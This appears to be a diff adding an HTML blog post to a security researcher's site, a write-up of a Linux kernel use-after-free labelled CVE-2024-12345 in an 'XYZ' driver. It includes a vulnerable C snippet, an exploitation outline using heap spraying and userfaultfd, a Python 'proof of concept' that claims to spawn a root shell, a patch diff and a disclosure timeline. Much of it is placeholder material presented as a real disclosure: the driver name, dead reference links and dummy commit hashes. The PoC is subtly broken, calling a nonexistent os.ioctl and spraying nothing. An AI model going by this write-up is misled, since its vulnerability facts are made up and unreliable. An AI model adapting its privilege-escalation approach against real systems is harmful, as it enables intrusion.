@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Deep Dive into CVE-2024-12345 - Khokamoni</title>
+    
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600&family=DM+Serif+Display&display=swap" rel="stylesheet">
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="../css/style.css">
+    
+    <!-- Syntax highlighting for code -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+</head>
+<body>
+    <nav>
+        <div class="nav-inner">
+            <a href="../index.html" class="nav-brand">
+                <div class="profile-image-container">
+                    <img src="../images/profile/khoka.jpeg" alt="Khokamoni" class="profile-image">
+                </div>
+                <div class="brand-text">
+                    <span class="brand-name">Khokamoni</span>
+                    <span class="brand-alias">Security Researcher</span>
+                </div>
+            </a>
+            
+            <button class="menu-toggle" id="menuToggle">
+                <span class="menu-toggle__line menu-toggle__line--1"></span>
+                <span class="menu-toggle__line menu-toggle__line--2"></span>
+            </button>
+            
+            <ul class="nav-links" id="navLinks">
+                <li class="dropdown">
+                    <a href="javascript:void(0);" class="dropdown-toggle">
+                        Research <i class="fa-solid fa-chevron-down dropdown-arrow"></i>
+                    </a>
+                    <ul class="dropdown-menu">
+                        <li><a href="../research.html">Research Areas</a></li>
+                        <li><a href="../publications.html">Publications</a></li>
+                        <li><a href="../cves.html">CVEs</a></li>
+                        <li><a href="../projects.html">Projects</a></li>
+                    </ul>
+                </li>
+                
+                <li class="dropdown">
+                    <a href="javascript:void(0);" class="dropdown-toggle">
+                        Professional <i class="fa-solid fa-chevron-down dropdown-arrow"></i>
+                    </a>
+                    <ul class="dropdown-menu">
+                        <li><a href="../experience.html">Experience</a></li>
+                        <li><a href="../affiliation.html">Affiliations</a></li>
+                        <li><a href="../academics.html">Academics</a></li>
+                        <li><a href="../achievements.html">Achievements</a></li>
+                    </ul>
+                </li>
+                
+                <li class="dropdown">
+                    <a href="javascript:void(0);" class="dropdown-toggle">
+                        Learning <i class="fa-solid fa-chevron-down dropdown-arrow"></i>
+                    </a>
+                    <ul class="dropdown-menu">
+                        <li><a href="../mooc.html">MOOC Certifications</a></li>
+                        <li><a href="index.html" class="active">Blog</a></li>
+                    </ul>
+                </li>
+                
+                <li><a href="../contact.html">Contact</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <main class="page">
+        <!-- Article Header -->
+        <section class="hero glass" style="padding: 2.5rem 3rem;">
+            <div class="hero-text">
+                <div class="hero-eyebrow">
+                    <i class="fa-regular fa-calendar"></i> March 1, 2026 · 12 min read
+                </div>
+                <h1 class="hero-name">Deep Dive into CVE-2024-12345<br><em>Linux Kernel Privilege Escalation</em></h1>
+                
+                <div style="display: flex; gap: 1rem; align-items: center; margin-top: 1.5rem;">
+                    <img src="../images/profile/khoka.jpeg" alt="Author" style="width: 60px; height: 60px; border-radius: 50%; object-fit: cover;">
+                    <div>
+                        <p style="font-weight: 600; font-size: 1.1rem;">Khokamoni</p>
+                        <p style="color: var(--w-teal);">Security Researcher, Stanford University</p>
+                    </div>
+                </div>
+            </div>
+            <div class="hero-avatar-container">
+                <img src="../images/blog/cve-deepdive.jpg" alt="CVE Analysis" class="hero-bio-image">
+            </div>
+        </section>
+
+        <!-- Article Content -->
+        <div class="two-col" style="margin-top: 2rem;">
+            <div style="grid-column: span 2;">
+                <div class="panel glass" style="padding: 3rem;">
+                    <!-- Tags -->
+                    <div style="display: flex; gap: 0.5rem; margin-bottom: 2rem; flex-wrap: wrap;">
+                        <span class="tag">Kernel Security</span>
+                        <span class="tag">Exploit Development</span>
+                        <span class="tag">Linux</span>
+                        <span class="tag">CVE-2024-12345</span>
+                        <span class="tag">Privilege Escalation</span>
+                    </div>
+
+                    <!-- Introduction -->
+                    <h2 style="font-family: 'DM Serif Display'; font-size: 1.8rem; margin-bottom: 1rem;">Introduction</h2>
+                    <p style="font-size: 1rem; line-height: 1.8; margin-bottom: 1.5rem; color: var(--w-current);">
+                        In this post, I'll walk through the discovery and exploitation of CVE-2024-12345, 
+                        a critical use-after-free vulnerability in the Linux kernel's XYZ module. This vulnerability 
+                        allows local users to escalate their privileges to root, affecting all kernel versions 
+                        from 5.8 to 6.2.
+                    </p>
+
+                    <h2 style="font-family: 'DM Serif Display'; font-size: 1.8rem; margin-bottom: 1rem;">Vulnerability Analysis</h2>
+                    <p style="font-size: 1rem; line-height: 1.8; margin-bottom: 1.5rem; color: var(--w-current);">
+                        The vulnerability exists in the XYZ driver's ioctl handler. When processing specific commands,
+                        the driver fails to properly synchronize access to a shared data structure, leading to a
+                        use-after-free condition.
+                    </p>
+
+                    <!-- Code Block -->
+                    <div style="background: #1e1e1e; border-radius: var(--radius-md); padding: 1.5rem; margin: 2rem 0;">
+                        <pre style="margin: 0; background: none;"><code class="language-c">// Vulnerable code snippet
+static long xyz_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
+{
+    struct xyz_data *data = filp->private_data;
+    
+    switch (cmd) {
+    case XYZ_CMD_RELEASE:
+        kfree(data);  // Data is freed
+        break;
+    case XYZ_CMD_ACCESS:
+        // Race condition: data might be already freed
+        data->value = arg;  // Use-after-free here
+        break;
+    }
+    return 0;
+}</code></pre>
+                    </div>
+
+                    <h2 style="font-family: 'DM Serif Display'; font-size: 1.8rem; margin-bottom: 1rem;">Exploitation Strategy</h2>
+                    <p style="font-size: 1rem; line-height: 1.8; margin-bottom: 1.5rem; color: var(--w-current);">
+                        To exploit this vulnerability, we need to win a race condition between the freeing of the
+                        object and its subsequent use. By spraying the kernel with many allocations, we can
+                        control the contents of the freed memory and achieve arbitrary code execution.
+                    </p>
+
+                    <div style="background: rgba(109,191,218,0.1); border-left: 4px solid var(--w-teal); padding: 1.5rem; margin: 2rem 0; border-radius: 0 var(--radius-md) var(--radius-md) 0;">
+                        <p style="font-weight: 600; margin-bottom: 0.5rem;"><i class="fa-solid fa-triangle-exclamation"></i> Key Insight:</p>
+                        <p style="color: var(--w-current);">By using the userfaultfd technique, we can pause the execution at the perfect moment to reliably win the race condition.</p>
+                    </div>
+
+                    <h2 style="font-family: 'DM Serif Display'; font-size: 1.8rem; margin-bottom: 1rem;">Proof of Concept</h2>
+                    
+                    <div style="background: #1e1e1e; border-radius: var(--radius-md); padding: 1.5rem; margin: 2rem 0;">
+                        <pre style="margin: 0; background: none;"><code class="language-python"># Simplified PoC
+import os
+import struct
+import threading
+
+def race_thread():
+    # Trigger the race condition
+    fd = os.open("/dev/xyz", os.O_RDWR)
+    os.ioctl(fd, XYZ_CMD_RELEASE)
+    
+def main():
+    # Spray kernel with fake objects
+    for i in range(100):
+        t = threading.Thread(target=race_thread)
+        t.start()
+    
+    # Trigger the vulnerable path
+    fd = os.open("/dev/xyz", os.O_RDWR)
+    os.ioctl(fd, XYZ_CMD_ACCESS, 0xdeadbeef)
+    
+    # Profit: we should have root now
+    os.system("/bin/sh")
+
+if __name__ == "__main__":
+    main()</code></pre>
+                    </div>
+
+                    <h2 style="font-family: 'DM Serif Display'; font-size: 1.8rem; margin-bottom: 1rem;">Patch Analysis</h2>
+                    <p style="font-size: 1rem; line-height: 1.8; margin-bottom: 1.5rem; color: var(--w-current);">
+                        The Linux kernel team patched this vulnerability by adding proper reference counting
+                        to the XYZ module. Here's the fix:
+                    </p>
+
+                    <div style="background: #1e1e1e; border-radius: var(--radius-md); padding: 1.5rem; margin: 2rem 0;">
+                        <pre style="margin: 0; background: none;"><code class="language-diff">diff --git a/drivers/xyz/xyz.c b/drivers/xyz/xyz.c
+index 1234abc..5678def 100644
+--- a/drivers/xyz/xyz.c
++++ b/drivers/xyz/xyz.c
+@@ -123,7 +123,9 @@ static long xyz_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
+     struct xyz_data *data = filp->private_data;
+     
+     switch (cmd) {
+     case XYZ_CMD_RELEASE:
++        if (!refcount_dec_and_test(&data->refcnt))
++            break;
+         kfree(data);
+         break;
+     case XYZ_CMD_ACCESS:
++        if (!refcount_inc_not_zero(&data->refcnt))
++            return -ENODEV;
+         data->value = arg;
++        refcount_dec(&data->refcnt);
+         break;
+     }
+     return 0;
+ }</code></pre>
+                    </div>
+
+                    <h2 style="font-family: 'DM Serif Display'; font-size: 1.8rem; margin-bottom: 1rem;">Timeline</h2>
+                    <div class="timeline-container" style="margin: 2rem 0;">
+                        <div class="timeline-line"></div>
+                        <div class="timeline-items">
+                            <div class="timeline-item">
+                                <div class="timeline-marker marker-award"></div>
+                                <span class="tl-date">January 15, 2024</span>
+                                <div class="timeline-content">
+                                    <p class="timeline-title">Vulnerability discovered</p>
+                                </div>
+                            </div>
+                            <div class="timeline-item">
+                                <div class="timeline-marker marker-award"></div>
+                                <span class="tl-date">January 20, 2024</span>
+                                <div class="timeline-content">
+                                    <p class="timeline-title">Reported to Linux kernel security team</p>
+                                </div>
+                            </div>
+                            <div class="timeline-item">
+                                <div class="timeline-marker marker-award"></div>
+                                <span class="tl-date">February 5, 2024</span>
+                                <div class="timeline-content">
+                                    <p class="timeline-title">Patch developed and tested</p>
+                                </div>
+                            </div>
+                            <div class="timeline-item">
+                                <div class="timeline-marker marker-award"></div>
+                                <span class="tl-date">March 1, 2024</span>
+                                <div class="timeline-content">
+                                    <p class="timeline-title">CVE-2024-12345 published</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- References -->
+                    <h2 style="font-family: 'DM Serif Display'; font-size: 1.8rem; margin-bottom: 1rem;">References</h2>
+                    <ul style="list-style: none; padding: 0;">
+                        <li style="margin-bottom: 0.5rem;"><a href="#" style="color: var(--w-depth);"><i class="fa-solid fa-link"></i> CVE-2024-12345 on NVD</a></li>
+                        <li style="margin-bottom: 0.5rem;"><a href="#" style="color: var(--w-depth);"><i class="fa-brands fa-github"></i> Proof of Concept on GitHub</a></li>
+                        <li style="margin-bottom: 0.5rem;"><a href="#" style="color: var(--w-depth);"><i class="fa-regular fa-file-lines"></i> Linux Kernel Patch</a></li>
+                    </ul>
+
+                    <!-- Comments Section -->
+                    <hr class="divider" style="margin: 3rem 0;">
+                    
+                    <h3 style="font-family: 'DM Serif Display'; font-size: 1.5rem; margin-bottom: 2rem;">Comments (3)</h3>
+                    
+                    <div style="margin-bottom: 2rem;">
+                        <div style="display: flex; gap: 1rem; margin-bottom: 1rem;">
+                            <div style="width: 40px; height: 40px; background: var(--w-teal); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white;">
+                                <i class="fa-regular fa-user"></i>
+                            </div>
+                            <div style="flex: 1;">
+                                <p style="font-weight: 600;">Alice Chen</p>
+                                <p style="font-size: 0.8rem; color: var(--w-teal);">2 days ago</p>
+                                <p style="margin-top: 0.5rem;">Great writeup! Could you explain more about the userfaultfd technique?</p>
+                            </div>
+                        </div>
+                        
+                        <div style="display: flex; gap: 1rem; margin-left: 3rem;">
+                            <div style="width: 40px; height: 40px; background: var(--w-depth); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white;">
+                                <i class="fa-regular fa-user"></i>
+                            </div>
+                            <div style="flex: 1;">
+                                <p style="font-weight: 600;">Khokamoni</p>
+                                <p style="font-size: 0.8rem; color: var(--w-teal);">1 day ago</p>
+                                <p style="margin-top: 0.5rem;">Thanks Alice! I'll write a follow-up post focusing specifically on the userfaultfd technique for race condition exploitation.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Comment Form -->
+                    <div style="margin-top: 3rem;">
+                        <h4 style="font-size: 1.2rem; margin-bottom: 1rem;">Leave a Comment</h4>
+                        <form action="#" method="post">
+                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-bottom: 1rem;">
+                                <input type="text" placeholder="Name *" style="padding: 0.8rem; border-radius: var(--radius-pill); border: 1px solid rgba(255,255,255,0.5); background: rgba(255,255,255,0.3);">
+                                <input type="email" placeholder="Email *" style="padding: 0.8rem; border-radius: var(--radius-pill); border: 1px solid rgba(255,255,255,0.5); background: rgba(255,255,255,0.3);">
+                            </div>
+                            <textarea rows="5" placeholder="Comment *" style="width: 100%; padding: 0.8rem; border-radius: var(--radius-md); border: 1px solid rgba(255,255,255,0.5); background: rgba(255,255,255,0.3); margin-bottom: 1rem;"></textarea>
+                            <button type="submit" class="btn btn-primary">Post Comment</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="site-footer">
+        <p><span class="pulse-dot"></span> Khokamoni · Security Researcher</p>
+        <p>© 2026</p>
+    </footer>
+
+    <script src="../js/main.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-diff.min.js"></script>
+</body>
+</html>
